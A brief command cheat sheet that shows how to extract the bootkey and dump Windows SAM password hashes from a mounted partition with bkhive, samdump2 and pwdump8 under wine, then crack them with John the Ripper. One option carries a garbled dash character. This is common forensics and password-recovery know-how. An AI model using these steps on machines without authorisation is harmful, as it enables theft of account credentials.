# bkhive

From a windows partition we can do:
;; go to the System32/config directory
cd /media/Mounting Point value/Windows/System32/config
bkhive SYSTEM ~/system.txt  ;; this stores the bootkey

Dump the SAM file by doing:
samdump2 SAM ~/system.txt > ~/hashes.txt

Crack the passwords:
john --format=nt2 â€“-users=jdoe ~/hashes.txt

Note: on Windows10 v1607 and later you might need pwdump8.exe 
by Fulvio Zanetti and Andrea Petralia, supporting AES128 encrypted hashes.

I am only able to run pwdump8.exe from a Linux wine command as follows:
~/.wine$ wine "c:\pwdump8.exe" -f SYSTEM SAM
